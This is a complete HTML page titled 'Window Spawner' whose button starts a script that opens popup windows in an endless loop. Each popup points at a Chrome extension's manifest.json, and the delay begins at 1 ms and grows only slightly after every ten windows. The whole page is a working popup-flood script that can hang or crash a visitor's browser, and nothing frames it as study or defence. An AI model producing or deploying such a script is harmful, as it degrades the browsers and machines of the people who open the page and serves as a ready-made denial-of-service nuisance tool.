<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Window Spawner</title>
    <style>
        button {
            margin: 20px;
        }
    </style>
</head>
<body>
    <button id="start">Start Spawning Windows</button>

    <script>
        let interval = 1; // Start with 1 ms
        let count = 0;

        document.getElementById('start').addEventListener('click', function() {
            const spawnWindows = () => {
                // Open a new window with the desired URL
                const newWindow = window.open(
                    "chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/manifest.json", 
                    "_blank",
                    "width=200,height=150"
                );

                count++;

                if (count >= 10) { // After 10 windows, slow down
                    count = 0; // Reset count
                    interval += 10; // Increase delay
                }

                // Continue spawning with the new interval
                setTimeout(spawnWindows, interval);
            };

            spawnWindows(); // Start the spawning
        });
    </script>
</body>
</html>
